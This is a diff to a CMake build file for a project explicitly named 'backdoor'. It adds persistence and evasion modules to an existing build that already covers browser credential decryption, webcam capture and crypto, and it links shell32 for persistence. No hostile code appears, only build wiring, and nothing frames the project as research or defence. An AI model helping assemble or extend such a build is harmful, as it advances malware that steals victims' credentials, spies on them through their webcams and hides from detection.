@@ -21,6 +21,8 @@ add_executable(backdoor
     src/browser.c
     src/webcam.c
     src/crypto.c
+    src/persistence.c
+    src/evasion.c
     # Uncomment and add sqlite3.c when using browser credential extraction:
     # src/sqlite3.c
 )
@@ -40,6 +42,7 @@ target_link_libraries(backdoor
     crypt32     # DPAPI (browser credential decryption)
     strmiids    # DirectShow GUIDs (webcam)
     ole32       # COM (webcam)
+    shell32     # Shell API (SHGetFolderPath for persistence)
     # mfplat    # Media Foundation (alternative webcam - uncomment if using)
     # mf        # Media Foundation
     # mfreadwrite # Media Foundation
